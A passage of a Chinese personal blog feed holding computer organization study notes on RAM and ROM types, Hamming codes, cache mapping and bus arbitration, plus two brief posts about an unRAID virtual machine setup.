alt="线选法"></p><p>单译码的含义：只用一个地址译码器电路将地址信号变换成选中信号，译码器输出的每一根线可选中存储单元的各位。这种选中信号称为字选择信号。</p><p>线选法的特点：</p><ol><li>译码结构简单、速度快、但器材用量大（n根地址线用$2^n$套驱动器），当容量大时成本太高。仅适合高速小容量存储器</li><li>并行输入/输出(数据I/O)按多位(字节)组织</li></ol><h3 id="重合法（双译码方式）"><a href="#重合法（双译码方式）" class="headerlink" title="重合法（双译码方式）"></a>重合法（双译码方式）</h3><p><img src="/2024/03/26/重合法.png" alt="重合法"></p><p>双译码的含义：使用两个译码电路（称为X译码器和Y译码器），分别产生行选择信号和列选择信号，行选择信号和列选择信号同时有效的存储单元为被选中的存储单元。</p><p>重合法的特点：</p><ol><li>与线材法相比大大减少了译码输出线根数，则器材用量也大大减少、有效降低了存储器的成本，适用于大容量存储芯片</li><li>数据位I/O 按位组织</li></ol><h2 id="随机存储器（RAM）"><a href="#随机存储器（RAM）" class="headerlink" title="随机存储器（RAM）"></a>随机存储器（RAM）</h2><h3 id="静态RAM（SRAM）"><a href="#静态RAM（SRAM）" class="headerlink" title="静态RAM（SRAM）"></a>静态RAM（SRAM）</h3><p>静态RAM基本电路</p><p><img src="/2024/03/26/SRAM.png" alt="SRAM"></p><p>SRAM读操作：</p><ol><li>行选：$T_5$，$T_6$开</li><li>列选：$T_7$，$T_8$开</li><li>$V_A \rightarrow T_6 \rightarrow T_8 \rightarrow 读放\rightarrow D_{OUT}$</li></ol><p>SRAM写操作：</p><ol><li>行选：$T_5$，$T_6$开</li><li>列选：$T_7$，$T_8$开</li><li>$D_{IN}$ 两个写放 </li></ol><p>​        （左）$D_{IN}\rightarrow 反相\rightarrow T_7 \rightarrow T_5 \rightarrow A^{‘}$ </p><p>​        （右）$D_{IN}\rightarrow T_8\rightarrow T_6 \rightarrow A$</p><p>SRAM读时序图：</p><p><img src="/2024/03/26/读时序.png" alt="读时序"></p><p>SRAM写时序图：</p><p><img src="/2024/03/26/写时序.png" alt="写时序"></p><h3 id="动态RAM（DRAM）"><a href="#动态RAM（DRAM）" class="headerlink" title="动态RAM（DRAM）"></a>动态RAM（DRAM）</h3><p>基本电路：</p><p><img src="/2024/03/26/DRAM.png" alt="DRAM"></p><p>时序：</p><p><img src="/2024/03/26/时序1.png" alt="时序1"></p><p><img src="/2024/03/26/时序2.png" alt="时序2"></p><p>DRAM刷新：</p><p>​    DRAM靠电容存储的电荷来表示信息，由于漏电流的存在，电容上的电荷会缓慢消失，为了保证存储信息的稳定性和正确性，需要隔一段时间给电容补充电荷，这个过程称为“刷新”或“再生”。</p><p>​    <strong>DRAM是破坏性读出</strong>    </p><p> 读放大器同时又是再生放大器，利用双稳态结构，在读出过程中建立起稳态，然后该稳态再自动写回存储单元。        刷新与常规读/写操作不同，为了节省时间，通常不是按字逐个单元处理，而是每次刷新内部存储矩阵的一行，即为连接在同一行上所有存储元的电容补充一次能量。因此，刷新周期只送行地址，不送列地址，I/O电路不打开，数据线无输出，相当于一次“内部读”操作。 </p><p> <strong>典型的刷新间隔为2ms</strong></p><p>刷新周期：对DRAM的刷新是按行进行的，每刷新一行的时间称为刷新周</p><p>几种刷新方式：</p><ol><li>集中刷新：在一个刷新间隔内，集中一段时间对全部存储单元进行逐行刷新，在此期间正常的读/写操作将被停止，所以这段时间称为死时间。</li><li>分散刷新：将刷新分散到每个读/写周期内完成</li><li>分散刷新与集中刷新相结合（异步刷新）：在最大刷新时间间隔内，对芯片内的全部存储元逐行轮流刷新一遍。刷新周期平均分散在最大刷新间隔中。</li></ol><p>三种刷新方式的特点：</p><p>​    集中刷新：正常工作期间DRAM可达全效率，但刷新期间CPU不能访存（例中为16µs），形成访存“死区”</p><p>​    分散刷新：消除了访存死区，但使CPU访存周期延长一倍（例中 =1µs）。另外，存在多余的刷新操作</p><p>​    集中与分散相结合：结合集中、分散刷新的优点，既克服了死时间，又没有多余的刷新操作，DRAM工作效率达到最高，是一种理想的刷新方式，得到广泛应用。但这种方式控制较复杂，需要较多的存储器外围电路支持（刷新地址计数器、刷新定时器、访存仲裁逻辑等）</p><h3 id="DRAM和SRAM的比较"><a href="#DRAM和SRAM的比较" class="headerlink" title="DRAM和SRAM的比较"></a>DRAM和SRAM的比较</h3><p><img src="/2024/03/26/SD比较.png" alt="SD比较"></p><h2 id="只读存储器（ROM）"><a href="#只读存储器（ROM）" class="headerlink" title="只读存储器（ROM）"></a>只读存储器（ROM）</h2><h3 id="掩膜ROM（MROM）"><a href="#掩膜ROM（MROM）" class="headerlink" title="掩膜ROM（MROM）"></a>掩膜ROM（MROM）</h3><p><img src="/2024/03/26/MROM.png" alt="MROM"></p><h3 id="PROM（一次性编程）"><a href="#PROM（一次性编程）" class="headerlink" title="PROM（一次性编程）"></a>PROM（一次性编程）</h3><p><img src="/2024/03/26/PROM.png" alt="PROM"></p><h3 id="EPROM（多次性编程）"><a href="#EPROM（多次性编程）" class="headerlink" title="EPROM（多次性编程）"></a>EPROM（多次性编程）</h3><p><img src="/2024/03/26/EPROM.png" alt="EPROM"></p><p><img src="/2024/03/26/EPROM2.png" alt="EPROM2"></p><h3 id="EEPROM（电可擦除可编程只读存储器）"><a href="#EEPROM（电可擦除可编程只读存储器）" class="headerlink" title="EEPROM（电可擦除可编程只读存储器）"></a>EEPROM（电可擦除可编程只读存储器）</h3><p>特点是：</p><ol><li>擦除和编程均可联机进行，更加方便</li><li>电可擦写</li><li>局部擦写</li><li>全部擦写</li></ol><h3 id="Flash-Memory（快擦型存储器）"><a href="#Flash-Memory（快擦型存储器）" class="headerlink" title="Flash Memory（快擦型存储器）"></a>Flash Memory（快擦型存储器）</h3><p>特点：擦除和写入速度更快</p><p>与EEPROM不同的是只能整体擦或分区擦</p><blockquote><p>由于闪速存储器具有非电易失性，且读取速度与DRAM接近，写入速度与硬盘接近，因此目前逐渐用来替代软、硬盘，称为半导体盘，具有无机械运动，抗震性好，可靠性高等优点，发展前景看好。</p></blockquote><h3 id="概括图"><a href="#概括图" class="headerlink" title="概括图"></a>概括图</h3><p><img src="/2024/03/26/概括.png" alt="概括"></p><h1 id="主存储器"><a href="#主存储器" class="headerlink" title="主存储器"></a>主存储器</h1><p><strong>主存储器由RAM和ROM芯片组成</strong>。</p><p>例如，系统程序区存放的是不需要改动也不允许改动的系统程序，所以这部分存储空间应用ROM来实现；系统程序工作区是系统程序在工作时写入并读出临时数据的，所以这部分存储空间应用RAM来实现。用户程序区存放的是用户的程序与数据，这些信息是可读、可改写的，所以这部分存储空间也应用RAM来实现。       </p><p> 由于单片存储芯片提供的存储容量与存储字长一般不能直接满足实际需求，所以经常是将若干存储芯片连接在一起组成特定机器的存储系统，这就叫<strong>存储器扩展</strong>。</p><h2 id="存储器的拓展"><a href="#存储器的拓展" class="headerlink" title="存储器的拓展"></a>存储器的拓展</h2><h3 id="存储器容量拓展"><a href="#存储器容量拓展" class="headerlink" title="存储器容量拓展"></a>存储器容量拓展</h3><h4 id="位拓展（增加存储字长）"><a href="#位拓展（增加存储字长）" class="headerlink" title="位拓展（增加存储字长）"></a>位拓展（增加存储字长）</h4><p><img src="/2024/03/26/位拓展.png" alt="位拓展"></p><h4 id="字拓展（增加存储字的数量）"><a href="#字拓展（增加存储字的数量）" class="headerlink" title="字拓展（增加存储字的数量）"></a>字拓展（增加存储字的数量）</h4><p><img src="/2024/03/26/字拓展.png" alt="字拓展"></p><h4 id="字、位拓展"><a href="#字、位拓展" class="headerlink" title="字、位拓展"></a>字、位拓展</h4><p><img src="/2024/03/26/位字拓展.png" alt="位字拓展"></p><h3 id="存储器与CPU的连接"><a href="#存储器与CPU的连接" class="headerlink" title="存储器与CPU的连接"></a>存储器与CPU的连接</h3><p><img src="/2024/03/26/存储器与CPU的连接.png" alt="存储器与CPU的连接"></p><h3 id="CPU对主存的读写操作"><a href="#CPU对主存的读写操作" class="headerlink" title="CPU对主存的读写操作"></a>CPU对主存的读写操作</h3><p><strong>读操作</strong>：CPU从指定的存储单元取出信息的过程</p><ol><li>CPU将地址信号发送到地址总线</li><li>CPU发出读命令</li><li>读出信息经数据总线送至CPU</li></ol><p><strong>写操作</strong>：CPU将要写入的信息存入指定的存储单元</p><ol><li>CPU将地址信号发送到地址总线</li><li>CPU将要写入的数据发送到数据总线</li><li>CPU发出写命令</li><li>等待信息经数据总线送至存储器</li></ol><h2 id="存储器的校验"><a href="#存储器的校验" class="headerlink" title="存储器的校验"></a>存储器的校验</h2><p>前置知识：奇偶校验</p><p>偶校验：补一位校验位，统计数据位中1的个数，若是偶数，校验位为0，否则为1</p><p>奇校验：补一位校验位，统计数据位中1的个数，若是奇数，校验位为0，否则为1</p><h3 id="编码的最小距离"><a href="#编码的最小距离" class="headerlink" title="编码的最小距离"></a>编码的最小距离</h3><p>任意两组合法代码之间 <strong>二进制位数</strong> 的 <strong>最少差异</strong></p><p>编码的纠错 、检错能力与编码的最小距离有关</p><script type="math/tex; mode=display">L-1=D+C \space(D\geq C)\\</script><p>L为编码的最小距离</p><p>D为检测错误的位数</p><p>C为纠正错误的位数</p><h3 id="汉明码"><a href="#汉明码" class="headerlink" title="汉明码"></a>汉明码</h3><blockquote><p>具有一位纠错能力的编码</p></blockquote><p>设数据位共n位</p><p>汉明码需增添k位校验位，其中k满足：</p><script type="math/tex; mode=display">2^k\geq n+k+1</script><p>检测位的位置分别在第$2^i$位，其中$i=0,1,2,3,4,…$</p><p>检测位的取值与该位所在的检测小组中承担的奇偶校验任务有关</p><p>各检测位$C_i$所承担的检测小组为：</p><p>$C_1$检测的$g_1$小组包含第 1，3，5，7，9，11，…</p><p>$C_2$检测的$g_2$小组包含第 2，3，6，7，10，11，…</p><p>$C_3$检测的$g_3$小组包含第 4，5，6，7，12，13，…</p><p>$C_4$检测的$g_4$小组包含第 8，9，10，11，12，13，14，15，24，…</p><p>规律：</p><p>$g_i$小组独占第$2^{i-1}$位</p><p>$g_i$和$g_j$小组共同占第$2^{i-1}+2^{j-1}$位</p><p>$g_i$，$g_j$和$g_l$小组共同占第$2^{i-1}+2^{j-1}+2^{l-1}$位</p><h3 id="汉明码的纠错"><a href="#汉明码的纠错" class="headerlink" title="汉明码的纠错"></a>汉明码的纠错</h3><p>新增新的检测位$P_i$，其位数与增添的检测位有关，就是检测位的位置</p><p>$P_i$即把该小组的成员做异或运算</p><p>对于偶校验配置的汉明码 $P_i$均为0时不出错</p><p>对于奇校验配置的汉明吗 $P_i$均为1时不出错</p><p>纠错过程即排除法，排除正确的，没出错的小组成员</p><h2 id="提高访存速度的措施"><a href="#提高访存速度的措施" class="headerlink" title="提高访存速度的措施"></a>提高访存速度的措施</h2><blockquote><ol><li>采用高速器件</li><li>采用层次结构 Cache 主存</li><li>调整主存结构</li></ol></blockquote><ol><li>单体多字系统</li></ol><p>前提条件是：1.指令和数据在存储体内连续存放；2.内存在硬件配置上支持</p><p>在一个存取周期内，从一个地址取出四条指令，再逐条将指令送去CPU执行；即每四分之一存取周期，主存向CPU送一条指令</p><p><img src="/2024/03/26/单体多字系统.png" alt="单体多字"></p><p>一次性取出4W位，带宽增大4倍，速度提高了</p><ol><li>多体并行系统</li></ol><p>采用多体模块组成的存储器。它们能并行工作，又能交叉工作</p><p>其中，每个模块应当有相同的容量和存取速度；并均有独立的地址寄存器、地址译码器、驱动电路、读写电路</p><p>并行工作即可同时访问N个模块，同时启动，同时读出，完全并行的工作</p><p>特点：1.带宽增大N倍；2.并行工作；3.有利于单字操作</p><h3 id="两种编码"><a href="#两种编码" class="headerlink" title="两种编码"></a>两种编码</h3><h4 id="高位交叉"><a href="#高位交叉" class="headerlink" title="高位交叉"></a>高位交叉</h4><p>存储单元的高位用于编号 顺序编址</p><p>特点：</p><ol><li>同一存储体的地址空间连续</li><li>不利于并行处理</li><li>容易发生访存冲突</li></ol><h4 id="低位交叉"><a href="#低位交叉" class="headerlink" title="低位交叉"></a>低位交叉</h4><p>存储单元的低位用于编号 各个体轮流编址</p><p>特点：</p><ol><li>同一存储体内地址不连续，以N为模</li><li>访存冲突小</li><li>程序连续存放，容易形成并行工作局面</li></ol><h1 id="高速缓冲存储器"><a href="#高速缓冲存储器" class="headerlink" title="高速缓冲存储器"></a>高速缓冲存储器</h1><p>cache用于解决高性能与低价位的矛盾，解决CPU与I/O的访存冲突</p><blockquote><p>目的：用小容量的SRAM与大容量的DRAM构成一个性能近似于SRAM而价格相当于DRAM的存储系统</p></blockquote><h2 id="Cache的工作原理"><a href="#Cache的工作原理" class="headerlink" title="Cache的工作原理"></a>Cache的工作原理</h2><h3 id="主存和缓存的编址"><a href="#主存和缓存的编址" class="headerlink" title="主存和缓存的编址"></a>主存和缓存的编址</h3><p><img src="/2024/03/26/主存缓存编址.png" alt="主存缓存编址"></p><p>缓存会有标记位</p><ol><li>CPU发出访问主存的地址，这个地址同时会被Cache接收到</li><li>若目标数据在Cache中（命中）则Cache先于主存把数据送往CPU</li><li>若没命中，则主存会把目标数据送往CPU（按字传送），同时主存会把该数据所在<strong>块</strong>送给cache（按块传送）</li></ol><h3 id="命中与未命中"><a href="#命中与未命中" class="headerlink" title="命中与未命中"></a>命中与未命中</h3><p>缓存共C块</p><p>主存共M块 M&gt;&gt;C</p><p>命中 主存块调入缓存主存块与缓存块建立了对应的关系</p><p>用<strong>标记记录</strong>某缓存块建立了对应关系的主存块号</p><p>未命中 主存块未调入缓存</p><p>主存块与缓存块未建立对应的关系</p><h3 id="Cache的命中率"><a href="#Cache的命中率" class="headerlink" title="Cache的命中率"></a>Cache的命中率</h3><p>CPU欲访问的信息在Cache中的比率</p><p>命中率与Cache的容量与块长有关</p><p>一般每块可取4～8个字</p><p>块长取一个存取周期内从主存调出的信息长度</p><h3 id="Cache-主存系统的效率"><a href="#Cache-主存系统的效率" class="headerlink" title="Cache-主存系统的效率"></a>Cache-主存系统的效率</h3><p>效率e与命中率有关</p><script type="math/tex; mode=display">e=\frac{访问Cache的时间}{平均访问时间} \times 100 \%</script><p>设Cache命中率为h，访问Cache的时间为$t_c$，访问主存的时间为$t_m$</p><p>则</p><script type="math/tex; mode=display">e=\frac{t_c}{h \times t_c-(1-h) \times t_m} \times 100 \%</script><h3 id="实现Cache要解决的问题"><a href="#实现Cache要解决的问题" class="headerlink" title="实现Cache要解决的问题"></a>实现Cache要解决的问题</h3><ol><li>Cache内容与主存之间的映像关系</li><li>如何实现地址的转换，将访问的主存地址转换为Cache地址</li><li>访问Cache未命中时，若Cache没有满，如何调入Cache；Cache满时，块如何替换</li><li>Cache的一致性问题，即块的更新策略</li></ol><h2 id="Cache的基本结构"><a href="#Cache的基本结构" class="headerlink" title="Cache的基本结构"></a>Cache的基本结构</h2><p><img src="/2024/03/26/cache.png" alt="Cache"></p><h2 id="地址映像和变换"><a href="#地址映像和变换" class="headerlink" title="地址映像和变换"></a>地址映像和变换</h2><p>地址映象：为了把信息放到Cache中，必须应用某种函数把主存地址映像到Cache，称作地址映像</p><p>地址变换：在信息按照这种映像关系装入Cache后，执行程序时，应将主存地址变换成Cache地址，这个变换过程叫做地址变换</p><p>基本地址映象：直接映象、全相联映象、组相联映象、段相连映象</p><h4 id="直接映像"><a href="#直接映像" class="headerlink" title="直接映像"></a>直接映像</h4><p>$i=jmod C$  </p><p>每个缓存块i可以和若干个主存块对应</p><p>每个主存块j只能和一个缓存块对应</p><p>特点：</p><ol><li>固定、死板易发生冲突，导致频繁的换进换出，适合Cache容量较大的情况</li><li>硬件实现简单，成本低</li></ol><h4 id="全相联映像"><a href="#全相联映像" class="headerlink" title="全相联映像"></a>全相联映像</h4><p>主存中的任一块可以映像到缓存中的任一块</p><p>特点：</p><ol><li>优点是极其自由灵活</li><li>缺点是以硬件电路的复杂来作为牺牲</li></ol><h4 id="组相联映像"><a href="#组相联映像" class="headerlink" title="组相联映像"></a>组相联映像</h4><p>$i=jmodQ$</p><p>某一主存块j按模Q映射到缓存的第i组中的任一块</p><h4 id="段相连映像"><a href="#段相连映像" class="headerlink" title="段相连映像"></a>段相连映像</h4><p> 段相联映象是直接映象和全相联映象结合的另一种方式。       </p><p>它是把主存和Cache都分成若干段，且使它们每段包含的块数都相等，段之间采用全相联映象，段内块之间采用直接映象。       </p><p>当段数与Cache块数相等时，为全相联映象；当段数为1时为直接映象。</p><h2 id="替换算法"><a href="#替换算法" class="headerlink" title="替换算法"></a>替换算法</h2><p>替换算法的目标，是使Cache获得最高的命中率，就是让Cache中总是保持着使用频率高的数据，从而使ＣＰＵ访问Cache的成功率最高 </p><h4 id="先进先出法（FIFO）"><a href="#先进先出法（FIFO）" class="headerlink" title="先进先出法（FIFO）"></a>先进先出法（FIFO）</h4><h4 id="近期最少使用算法（LRU）"><a href="#近期最少使用算法（LRU）" class="headerlink" title="近期最少使用算法（LRU）"></a>近期最少使用算法（LRU）</h4><h4 id="随机法"><a href="#随机法" class="headerlink" title="随机法"></a>随机法</h4><h2 id="Cache的读写操作"><a href="#Cache的读写操作" class="headerlink" title="Cache的读写操作"></a>Cache的读写操作</h2><h3 id="读"><a href="#读" class="headerlink" title="读"></a>读</h3><p><img src="/2024/03/26/读.png" alt="读"></p><h3 id="写"><a href="#写" class="headerlink" title="写"></a>写</h3><p>由于Cache内容只是内存的一部分内容拷贝，它应当与主存内容保持一致。而CPU对Cache的写入更改了Cache中的内容。如何保持内存与Cache内容的一致性，有以下几种策略。</p><ol><li><p>全写法（写直达法）</p><p>当写Cache命中时，CPU对主存和Cache同时进行写作，可较好的维护Cache与内存的一致性；</p><p>当未命中时，CPU只直接写入内存</p><p>特点：</p><ol><li>可完全保持内存和Cache的一致性</li><li>由于对主存访问频繁，故在一定程度上降低了Cache的高速缓冲功能</li></ol></li><li><p>全写法（写直达法）</p><p>当CPU写Cache命中时，只修改Cache中的内容，而不立即写入主存，只有当该块被换出到内存时才写回主存<br>当CPU写Cache未命中时，将此块拷贝到Cache中进行修改，而主存的写操作统一留到该块被换出时才进行</p><p>特点：</p><ol><li>写操作都是在Cache完成的，效率较高</li><li>写内存和写Cache是异步进行的，故存在内存和Cache不一致隐患</li></ol></li></ol><h2 id="Cache的改进"><a href="#Cache的改进" class="headerlink" title="Cache的改进"></a>Cache的改进</h2><ol><li>增加Cache的级数</li><li>统一缓存和分开缓存</li></ol>]]></content>
      
      
      <categories>
          
          <category> 计算机组成原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 硬件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于unraid的新进展</title>
      <link href="/2024/03/23/"/>
      <url>/2024/03/23/</url>
      
        <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>之前用windows10很好安装，遂凑合</p><p>但是前几天突然很卡，且重建两个系统都很慢，猜测是虚拟磁盘的速度到头了</p><p>最终决定把两条nvme的ssd直通给虚拟机，一个用作系统盘</p><h1 id="最新进展"><a href="#最新进展" class="headerlink" title="最新进展"></a>最新进展</h1><p>安装了win11 得用TPM的bios不然安装不了</p><p>磁盘驱动器一开始安装不了，后来改了下分区格式gpt就好了</p><p>很顺利，还没改uefi启动顺序导致一开机进入uefi</p><p>在考虑要不要改</p><p>原因是改了可能就进不去了，毕竟虚拟机启动时未必键盘能连上（猜测了）</p><p>不改启动不够迅速（doge）</p><p>之后看，<strong>也可以写个文章分享下怎么装</strong></p><h1 id="性能问题"><a href="#性能问题" class="headerlink" title="性能问题"></a>性能问题</h1><p>cpu是直通的显卡是直通的磁盘是直通的</p><p>内存没通道，估计就是单通道？之后问问内存的问题</p><p>性能比之前的虚拟机快多了，爽，win11性能也有优化，总之非常值得直通</p><h1 id="代价"><a href="#代价" class="headerlink" title="代价"></a>代价</h1><p>由于直通少了一个硬盘</p><p>可能nas那块的存储少了，买了个2t ssd固态sata口的准备和机械盘放一起，又要拆机箱.jpg</p><p>作者-129元</p><p>今天还买了个显示器挂灯，改善一下工作环境-179元</p><p>笑死，希望最近两个刚起步的事儿能一步步做下去</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>bad</title>
      <link href="/2024/03/21/"/>
      <url>/2024/03/21/</url>
      
        <content type="html"><![CDATA[<p>啥也没干把虚拟机整爆了，尝试恢复img镜像文件<br>博客文件有的没了，迅速迁移了<br>QAQ</p><h1 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h1><p>原因是wsl和hyperv在虚拟机中启动了，嵌套的虚拟机导致文件资源管理器异常卡顿<br>处理一次卡顿电脑后发现，电脑卡顿大概率是开了虚拟化，docker和安装子系统都可能导致</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【计算机组成原理】系统总线</title>
      <link href="/2024/03/14/"/>
      <url>/2024/03/14/</url>
      
        <content type="html"><![CDATA[<h1 id="总线概述"><a href="#总线概述" class="headerlink" title="总线概述"></a>总线概述</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>定义：<strong>总线(BUS)</strong>是计算机各个部件（或系统）之间传递信息的一组共享的电导线</p><blockquote><p>每根导线负责传递一个电脉冲信号，即一位二进制数据</p><p>若干根导线即可同时传输若干位二进制数据</p></blockquote><p>组成：总线一般由<strong>传输线+接口+总线控制器</strong>组成</p><p>传输线包括：</p><script type="math/tex; mode=display">传输线\begin{cases}信息线\begin{cases}数据总线\\地址总线\\控制总线\end{cases}\\电源线\\地线等\end{cases}</script><p>总线从逻辑上有：1.输入 2.输出 3.断开   三种状态</p><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><h3 id="功能特性"><a href="#功能特性" class="headerlink" title="功能特性"></a>功能特性</h3><p>按传输信息性质分：地址总线、数据总线、控制总线</p><p>按连接部件分：系统总线（处理器总线）、输入输出总线（I/O总线）</p><p>​                                           </p><p>按照计算机系统中的位置分为：片内总线、底板总线、板间总线、通信总线</p><p>包括：插头、插座的几何形状与尺寸、引脚的数量和排列方式、固定方式</p><p>对通信总线，根据所传数据位数又可以分为：串行总线（一根）、并行总线（多根）</p><blockquote><p>总线传递的是数据和命令</p></blockquote><h3 id="电气特性"><a href="#电气特性" class="headerlink" title="电气特性"></a>电气特性</h3><p>定义了每根传输线上信号的<strong>传递方向</strong>和<strong>有效电平范围</strong></p><p>按允许信息传输的方向分：单向总线和双向总线</p><p>双向总线又分为全双工和半双工</p><blockquote><p>全双工指同一时刻允许信息分别沿两个方向传输</p><p>半双工指同一时刻只允许信息沿一个方向传输</p></blockquote><p>多数总线信号采用正逻辑</p><blockquote><p>高电平定义逻辑1</p></blockquote><h3 id="时间特性"><a href="#时间特性" class="headerlink" title="时间特性"></a>时间特性</h3><p>规定了每一根传输线上的信号在什么时候有效</p><p>即总线上的各种信号的时序关系</p><h3 id="总线技术特点"><a href="#总线技术特点" class="headerlink" title="总线技术特点"></a>总线技术特点</h3><p>1.使系统中的连线大大减少，可靠性高</p><p>2.便于硬件和软件的标准化，便于接口设计</p><p>3.易于系统模块化，可替换性好</p><p>4.便于维修。可维护性好</p><p>5.分时传送，任意时刻只有一个源发送，可以由多个部件接收</p><p>6.有仲裁机制</p><p>7.缺点：传输率受带宽限制 ，总线若故障，系统瘫痪</p><h1 id="总线控制"><a href="#总线控制" class="headerlink" title="总线控制"></a>总线控制</h1><h2 id="总线控制的功能和特点"><a href="#总线控制的功能和特点" class="headerlink" title="总线控制的功能和特点"></a>总线控制的功能和特点</h2><p>总线控制就是管理总线的使用</p><script type="math/tex; mode=display">\begin{cases}总线资源的管理\begin{cases}资源：存储空间、I/O空间、中断、通道\\管理：资源分配、冲突判定、设备选择、启动、复位\\\end{cases}\\总线仲裁\\总线定时（通信控制）\\总线连接，实现不同总线协议的转换\\\end{cases}</script><blockquote><p>特点：总线控制的功能由总线控制器来完成。而总线控制器在实现技术上并不一定存在一个独立的控制器模块。它的功能可能分布在总线的各个部件或设备上。</p></blockquote><h2 id="总线仲裁"><a href="#总线仲裁" class="headerlink" title="总线仲裁"></a>总线仲裁</h2><h3 id="总线设备分类"><a href="#总线设备分类" class="headerlink" title="总线设备分类"></a>总线设备分类</h3><p>按控制能力分：总线主设备和主线从设备</p><blockquote><p>总线主设备对总线具有控制能力，是信息传送的发起者</p><p>总线从设备对总线没有控制权，只能响应总线命令</p></blockquote><p>按信息传送分：总线源设备和总线目的设备</p><p>按访问控制分：存储器设备和I/O设备</p><h3 id="总线仲裁分类"><a href="#总线仲裁分类" class="headerlink" title="总线仲裁分类"></a>总线仲裁分类</h3><blockquote><p>从不同角度有不同分类方法</p></blockquote><p>根据仲裁电路结构：串行仲裁和并行仲裁</p><p>优先排队策略：固定优先级和动态优先级</p><p>仲裁电路分布：集中仲裁和分布仲裁</p><p>设备状态：设备请求方式（主动）和控制器查询方式（被动）</p><h3 id="集中仲裁的方式和特点"><a href="#集中仲裁的方式和特点" class="headerlink" title="集中仲裁的方式和特点"></a>集中仲裁的方式和特点</h3><h4 id="链式查询"><a href="#链式查询" class="headerlink" title="链式查询"></a>链式查询</h4><blockquote><p>通过一条判优链路（优先链）对所有主设备逐个串行进行查询</p></blockquote><p>有三条线：BS总线忙、BR总线请求、BG总线同意</p><p>如图：</p><p><img src="/2024/03/14/链式查询.png" alt="链式查询"></p><p>查询方法：</p><p>从离总线控制部件最近的设备开始查。首先查到的肯定是提出请求设备中优先权最高的一个。查到设备后，该设备通过总线忙卡断判优链路，占用总线；当操作结束后，该设备应当及时释放总线</p><p>特点：</p><ol><li>结构简单，易于扩充设备</li><li>对电路故障<strong>很敏感</strong></li><li>仲裁公平性差，固定优先级</li></ol><h4 id="计数器定时查询"><a href="#计数器定时查询" class="headerlink" title="计数器定时查询"></a>计数器定时查询</h4><blockquote><p>多加了设备地址线</p></blockquote><p><img src="/2024/03/14/计数器查询.png" alt="计数器查询"></p><p>查询方式：</p><p>  查询开始，计数器计数。每计一次数，就将计数值作为设备地址发往各个设备。每个申请总线的设备对地址进行识别，地址符合的设备获得总线控制权，停止计数。   </p><p>优先级设定：由计数初值决定最高优先级，3种方法。  </p><p>  a.查询时计数器从‘0’开始计数，即0号设备的优先级最高；    </p><p>  b.查询时计数器从上一次查询的终止点开始计数，则终止点优先级最高。此时优先级是循环的；   </p><p>  c.计数初值由程序设定，此时优先级可编程改变。</p><p>特点：</p><ol><li>软件查询、优先级控制方式灵活</li><li>对电路故障<strong>不敏感</strong></li><li>控制较复杂（增加了设备地址线）</li></ol><h4 id="独立请求方式"><a href="#独立请求方式" class="headerlink" title="独立请求方式"></a>独立请求方式</h4><blockquote><p>每个设备都有一组BGBR线</p></blockquote><p><img src="/2024/03/14/独立请求.png" alt="独立请求"></p><p>查询方式：</p><p>   每一个设备专门有一根BR线和BG线，各自通过独立的请求线向总线控制部件发请求，总线控制器里设置并行排队线路，同时接收各设备发来的请求信号并同时进行排队判优，然后通过各自独立的回答线发出总线同意信号。 </p><p>特点：</p><ol><li>响应速度快</li><li>优先级控制灵活</li><li>不适合多设备的场合</li></ol><h2 id="总线通信控制"><a href="#总线通信控制" class="headerlink" title="总线通信控制"></a>总线通信控制</h2><p>为了完成一次有效的通信，源设备与目的设备之间需要进行一系列有时序限制的操作。为此，通信双方需要“感知”对方的操作及操作效果，这个“感知”由总线通信控制来实现的。</p><p>总线通信控制方法分两大类：无须感知和需要感知</p><p>无需感知指通信双方相互信任，每一个通信步骤都会在规定的时间内正确完成；</p><p>如果通信双方不能完全相互信任则需要感知</p><p>基于“无须感知”观点进行总线通信控制的通信称为同步通信，基于“需要感知”观点进行总线通信控制的通信称为异步通信。</p><h2 id="总线通信控制-1"><a href="#总线通信控制-1" class="headerlink" title="总线通信控制"></a>总线通信控制</h2><blockquote><p>目的是要解决通信双方协调配合问题</p></blockquote><script type="math/tex; mode=display">总线传输周期\begin{cases}申请分配阶段 \space 主模块申请，总线仲裁决定\\寻址阶段 \space 主模块向从模块给出地址和命令\\传数阶段 \space 主模块和从模块交换数据\\结束阶段 \space 主模块撤销有关信息\end{cases}</script><p><strong>总线周期</strong>：</p><p><strong>一次完整的总线传送操作所需时间称为总线周期</strong></p><p>总线周期的基本类型:内存读   内存写  外设读  外设写</p><p>正常总线周期：由一次地址传送时间和一次数据传送时间组成 。 </p><blockquote><p>总线上数据的读/写方向是相对于主模块而言的，即：读：由从模块发送，主模块接收。即从主模块的角度看是读入（接收）； 写：由主模块发送，从模块接收。即从主模块的角度看是向对方写（发送）。</p></blockquote><h3 id="总线通信的四种方式"><a href="#总线通信的四种方式" class="headerlink" title="总线通信的四种方式"></a>总线通信的四种方式</h3><h4 id="同步通信"><a href="#同步通信" class="headerlink" title="同步通信"></a>同步通信</h4><blockquote><p>由统一时钟信号控制数据传送</p></blockquote><p>同步通信是指参与通信的两个部件之间的信息传送是由定宽、定距的时标来控制的。</p><p>每隔一个时标，源设备就向总线发送一个数据，而不去对目的设备是否收到数据进行确认； 同样地，目的设备每隔一个时标就对总线进行采样来获取数据，而不去确认数据是否已发出，也不向源设备确认收到的数据是正确的。</p><p>特点：</p><ol><li>强制性同步，采用统一时钟；简单易控制。</li><li>对于每一个操作，每一时间都有明确的规定，显得比较“死板”</li><li>必须按照工作速度最慢的部件来设计时钟。</li><li>当各个模块的存取时间相差较大时，会大大损失总线的工作效率</li><li>适用于总线长度较短，各模块部件存取时间比较一致的场合</li></ol><p><img src="/2024/03/14/同步通信.png" alt="同步通信" style="zoom:50%;"></p><p><img src="/2024/03/14/同步通信1.png" alt="同步通信" style="zoom:50%;"></p><h4 id="异步通信"><a href="#异步通信" class="headerlink" 